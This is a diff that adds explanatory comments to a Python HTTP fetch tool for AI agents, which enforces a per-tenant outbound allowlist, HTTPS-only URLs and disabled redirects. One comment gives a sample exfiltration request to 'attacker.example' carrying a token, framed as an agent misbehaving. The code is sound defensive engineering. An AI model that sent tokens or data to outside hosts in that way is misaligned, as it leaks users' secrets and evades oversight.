@@ -9,6 +9,8 @@ missing config file means an empty allowlist, which means no outbound
 HTTP. That is deliberately the safe default.
 """
 
+# The HTTP fetch tool, where the outbound allowlist from section 4 meets the execution layer
+
 from __future__ import annotations
 
 from typing import Any, ClassVar
@@ -33,6 +35,7 @@ class HTTPFetchInput(BaseModel):
 
     @field_validator("url")
     @classmethod
+    # HTTPS only. 
     def must_be_https(cls, value: str) -> str:
         parsed = urlparse(value)
         if parsed.scheme != "https":
@@ -43,6 +46,7 @@ class HTTPFetchInput(BaseModel):
 
     @field_validator("method")
     @classmethod
+    # known methods only.
     def method_in_allowlist(cls, value: str) -> str:
         upper = value.upper()
         if upper not in {"GET", "POST", "PUT", "PATCH", "DELETE"}:
@@ -79,6 +83,7 @@ class HTTPFetchTool(Tool):
         return False
 
     async def run(self, tenant: str, args: HTTPFetchInput) -> dict:  # type: ignore[override]
+        # If the agent decides to fetch https://attacker.example/exfil?token=..., the host is not on the tenant's allowlist and we raise PolicyError.
         host = urlparse(args.url).hostname or ""
         if not self._allowed(tenant, host):
             raise PolicyError(
@@ -87,6 +92,7 @@ class HTTPFetchTool(Tool):
                 hint=f"{host!r} is not on this tenant's outbound allowlist",
                 context={"host": host},
             )
+        #follow_redirects=False matters a lot. Without it, an allowlisted host could redirect to a non-allowlisted one, bypassing our check.
         try:
             async with httpx.AsyncClient(timeout=args.timeout_s, follow_redirects=False) as client:
                 resp = await client.request(
@@ -106,7 +112,7 @@ class HTTPFetchTool(Tool):
             "truncated": len(resp.content) > len(body_bytes),
         }
 
-
+# By disabling redirects, we force the agent to see the 3xx response and make an explicit decision about where to go next.
 def _load_allowlist() -> dict[str, list[str]]:
     import pathlib
     path = pathlib.Path("config/http_allowlist.yaml")
